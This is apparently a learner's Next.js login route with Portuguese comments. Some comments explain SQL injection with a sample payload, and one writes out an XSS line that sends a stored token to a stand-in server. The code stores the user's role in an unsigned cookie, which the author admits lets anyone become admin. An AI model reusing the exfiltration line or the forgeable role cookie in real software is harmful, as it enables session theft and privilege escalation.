import { NextResponse } from "next/server";
import bcrypt from "bcryptjs";
import pool from "../../../../lib/db";
import { cookies } from "next/headers";

export async function POST(request) {
    try {
        const body = await request.json();
        const { identifier, password } = body; // 'identifier' pode ser o e-mail ou o nome de usuário

        if (!identifier || !password) {
            return NextResponse.json(
                { message: "Preencha todos os campos." },
                { status: 400 }
            );
        }

        // Busca o usuário por e-mail OU por nome de usuário (coluna 'name')
        const result = await pool.query( // Envia uma instrução SQL (como SELECT, INSERT, UPDATE, DELETE) para o banco de dados.
            "SELECT * FROM users WHERE email = $1 OR name = $1", 
            [identifier]
            // Login com email e senha e o Identifier e $1 impede que um invasor manipule o banco de dados por inputs. Famoso SQL Injection. ' ' OR '1'='1', retornaria o primeiro usuario da tabela, o admin
        );
        // site ainda não está seguro, autenticação é feita apenas para teste, não é recomendado usar nome de usuário e senha reais, pois o site ainda não tem criptografia e segurança implementados, isso será feito em uma fase futura do projeto, por enquanto é apenas para fins de aprendizado e teste das funcionalidades básicas do marketplace. Um invasor consegue mudar seu privilegio para admin apenas editando o cookie, isso será corrigido com a implementação de JWT (JSON Web Tokens), além de outras medidas de segurança como validação de inputs e proteção contra ataques comuns (assim que eu aprender a implementar) O foco atual é aprender a criar as funcionalidades básicas do marketplace, a segurança será implementada em uma fase futura do projeto, quando as funcionalidades principais estiverem funcionando corretamente.
        if (result.rows.length === 0) {
            return NextResponse.json(
                { message: "Usuário ou senha incorretos." },
                { status: 401 }
            );
        }

        const user = result.rows[0];

        // Compara a senha digitada com o hash salvo no banco de dados
        const isPasswordValid = await bcrypt.compare(password, user.password_hash);

        if (!isPasswordValid) {
            return NextResponse.json(
                { message: "Usuário ou senha incorretos." },
                { status: 401 }
            );
        }

        // Remove o hash da senha por segurança antes de responder ao front-end
        delete user.password_hash;

        // Salva a sessão em um cookie HTTP-only (seguro contra ataques XSS)
        // O que um script malicioso faria se eu usasse localStorage:
        // fetch('https://servidor.com/log?cookie=' + localStorage.getItem('token'));
        // A maior ambição de um invasor ao explorar uma vulnerabilidade XSS é injetar um script JavaScript malicioso na página para roubar a sessão do usuário (fazer um Session Hijacking).
        const cookieStore = await cookies();
        cookieStore.set("schutz_session", JSON.stringify({ id: user.id, name: user.name, role: user.role }), { // estudar JWT (JSON Web Tokens), evitar mudar privilegios atraves de cookies
            httpOnly: true, // impede acesso ao cookie via JavaScript, segurança contra ataques XSS
            // Quando você define httpOnly: true, você está dando uma ordem expressa ao navegador: "Este cookie só pertence ao protocolo HTTP/HTTPS. Nenhum script rodando no frontend tem permissão para lê-lo ou modificá-lo".
            secure: process.env.NODE_ENV === "production",  
            // secure: quando o seu marketplace Schutz for para a produção, esse cookie só será trafegado se a conexão for criptografada (HTTPS). Isso impede que ataques do tipo Man-in-the-Middle sniffem o tráfego da rede para roubar o cookie de sessão.
            maxAge: 60 * 60 * 24 * 7, // Sessão dura 7 dias
            path: "/",
        });

        return NextResponse.json(
            { message: "Login realizado com sucesso.", user },
            { status: 200 }
        );

    } catch (error) {
        console.error("Erro ao realizar login:", error);
        return NextResponse.json(
            { message: "Erro interno ao realizar login." },
            { status: 500 }
        );
    }
}